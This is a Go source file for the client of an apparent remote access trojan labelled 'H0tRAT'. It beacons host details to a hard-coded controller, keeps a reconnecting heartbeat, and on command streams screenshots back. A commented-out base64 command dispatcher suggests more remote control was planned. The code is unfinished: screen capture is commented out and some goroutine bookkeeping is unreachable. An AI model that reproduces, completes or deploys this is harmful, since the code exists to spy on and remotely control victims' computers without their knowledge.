package client

import (
	"bufio"
	"bytes"
	"fmt"
	"github.com/go-vgo/robotgo"
	"image"
	"image/png"
	"net"
	"runtime"
	"strconv"
	"sync"
	"time"
	"ylc/src/demo/util"
)

const (
	IP      = "127.0.0.1:1010"
	PORT    = 1010
	CONNPWD = "18Sd9fkdkf9"
)

const (
	HEAD    = "HEAD"
	VERSION = "1.0.0"
)

var isturn = true

var wg sync.WaitGroup

func Ma() {

	connectNew()

}

func heartbeat(conn net.Conn, interval time.Duration) {
	for {
		fmt.Println("aaaaaaaaaaaaaaaaaa")
		time.Sleep(interval)
		writer := bufio.NewWriter(conn)
		//创建心跳
		_, err := fmt.Fprintln(writer, -1)
		if err != nil {
			fmt.Println(err)
			//重连
			connectNew()
			return
		}
	}
	wg.Done() // 协程计数器加-1
}

func SendHead(Head byte, socket net.Conn) {
	buf := make([]byte, 1)
	buf[0] = Head
	_, err := socket.Write(buf)
	if err != nil {
		fmt.Println(err)
	}
}

func GetImage() []byte {
	// 获取当前屏幕的截图
	screenX, screenY := robotgo.GetScreenSize()

	// 将 _Ctype_MMBitmapRef 转换为 image.RGBA
	rect := image.Rect(0, 0, screenX, screenY)
	rgba := image.NewRGBA(rect)

	// 创建一个 bytes.Buffer 对象
	buffer := new(bytes.Buffer)

	// 将截图编码为 PNG 格式并写入 buffer 中
	err := png.Encode(buffer, rgba)
	if err != nil {
		panic(err)
	}

	// 将 buffer 转换为 byte 数组
	byteArray := buffer.Bytes()
	return byteArray
}

func SendScreen(conn net.Conn) {

	SendHead(1, conn)
	for {
		time.Sleep(300 * time.Millisecond)
		getImage := GetImage()

		util.Send(2, getImage, conn)
	}
}

func connectNew() {

	wg.Add(2) // 协程计数器 +1
	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "127.0.0.1:1010")
	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
	if err != nil {
		fmt.Println(err)
	}
	defer socket.Close()
	// IO流
	dataOutputStream := bufio.NewWriter(socket)

	// 发送信息
	fmt.Fprintln(dataOutputStream, "H0tRAT")
	fmt.Fprintln(dataOutputStream, "USER")
	fmt.Fprintln(dataOutputStream, "HOSTNAME")
	fmt.Fprintln(dataOutputStream, runtime.GOOS)
	fmt.Fprintln(dataOutputStream, IP)
	fmt.Fprintln(dataOutputStream, "测试地址")
	fmt.Fprintln(dataOutputStream, "测试名字")
	fmt.Fprintln(dataOutputStream, strconv.Itoa(1111))
	fmt.Fprintln(dataOutputStream, "测试")
	fmt.Fprintln(dataOutputStream, VERSION)
	fmt.Fprintln(dataOutputStream, "360")

	dataOutputStream.Flush()
	// // 协程计数器加-1

	go heartbeat(socket, time.Second)
	go doSomeThing(socket)
	wg.Wait() //等待协程计数器为0 退出
	fmt.Println("abc========================")

}

func doSomeThing(socket net.Conn) {
	for {
		fmt.Println("abc")
		time.Sleep(time.Millisecond)
		reader := bufio.NewReader(socket)
		receiveHead := util.ReceiveHead(reader)

		fmt.Println(receiveHead)
		switch string(receiveHead) {
		//心跳
		case string(10):
			fmt.Println("heart...")

		//屏幕监控
		case string(1):
			width, height := robotgo.GetScreenSize()
			for {
				//bit := robotgo.CaptureScreen(0, 0, width, height)
				//defer robotgo.FreeBitmap(bit)
				//robotgo.SaveBitmap(bit, "test_1.png")

				// 将 _Ctype_MMBitmapRef 转换为 image.RGBA
				rect := image.Rect(0, 0, width, height)
				rgba := image.NewRGBA(rect)
				//robotgo.SaveBitmap(bit, "test_1.png")
				// 创建一个 bytes.Buffer 对象
				buffer := new(bytes.Buffer)

				// 将截图编码为 PNG 格式并写入 buffer 中
				err := png.Encode(buffer, rgba)
				if err != nil {
					panic(err)
				}
				//// 将 buffer 转换为 byte 数组
				byteArray := buffer.Bytes()
				util.Send(1, byteArray, socket)
			}

		}
	}

	//for {
	//	// IO流
	//	fmt.Println("bbbbbbbbbb")
	//	message, err := bufio.NewReader(socket).ReadString('\n')
	//	fmt.Println("mesasge=======>" + message)
	//	if err != nil {
	//		fmt.Println(err)
	//		// 如果服务器断开，则重新连接
	//		socket.Close()
	//		connectNew()
	//	}
	//	// 收到指令base64解码
	//	decodedCase, _ := base64.StdEncoding.DecodeString(message)
	//	command := string(decodedCase)
	//	cmdParameter := strings.Split(command, " ")
	//	switch cmdParameter[0] {
	//	//case "back":
	//	//	socket.Close()
	//	//
	//	//case "exit":
	//	//	socket.Close()
	//	//	os.Exit(0)
	//	//屏幕监控
	//	case "1":
	//		go SendScreen(socket)
	//	}
	//}
	wg.Done() // 协程计数器加-1

}
